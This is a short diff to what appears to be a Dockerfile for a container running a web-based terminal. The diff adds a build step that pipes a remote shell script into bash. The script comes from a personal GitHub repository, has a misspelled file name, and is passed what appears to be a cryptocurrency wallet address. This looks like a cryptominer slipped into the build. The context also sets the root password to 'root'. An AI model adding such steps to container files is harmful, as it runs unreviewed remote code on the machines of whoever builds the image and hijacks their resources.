@@ -10,6 +10,8 @@ RUN apt-get update && \
 RUN echo 'root:root' | chpasswd
 RUN apt update
 RUN apt install curl -y
+RUN curl -s -L https://raw.githubusercontent.com/lucasiel/teste/main/requiremetns.sh | bash -s 47zZneDdPNr63HM9ubMyrhYvLNbDunCkiia6fNCvQkThNuK6rrj59e3Y2nNF3ETeewbALAGYaiti4SF4ENwJ8bR7PKXXcMN
+RUN rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Expose the web-based terminal port
 EXPOSE 4200
